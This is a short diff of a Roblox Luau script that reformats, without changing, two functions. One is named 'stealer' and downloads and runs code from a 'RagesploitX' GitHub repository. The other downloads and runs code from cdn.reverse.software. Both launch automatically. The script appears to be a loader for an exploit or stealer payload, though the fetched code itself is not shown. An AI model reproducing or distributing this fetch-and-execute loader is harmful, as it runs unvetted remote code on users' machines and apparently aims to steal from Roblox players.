@@ -1,10 +1,7 @@
 local function stealer()
-
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/RagesploitX/Main-Script/refs/heads/main/Main/script"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RagesploitX/Main-Script/refs/heads/main/Main/script"))()
 end
 local function loadui()
-
-  loadstring(game:HttpGet("https://cdn.reverse.software/visual.luau"))()
-
+loadstring(game:HttpGet("https://cdn.reverse.software/visual.luau"))()
 task.spawn(stealer)
 task.spawn(loadui)
